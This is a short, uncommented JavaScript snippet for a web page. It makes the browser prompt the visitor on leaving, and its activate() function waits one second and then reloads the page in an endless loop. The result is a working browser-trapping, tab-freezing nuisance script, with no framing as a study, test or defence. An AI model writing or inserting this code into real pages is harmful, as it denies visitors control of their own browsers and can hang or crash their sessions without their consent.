onbeforeunload = () => true;
function activate() {
  setTimeout(function(){
    while(1)location.reload(1)
  }, 1000)
}
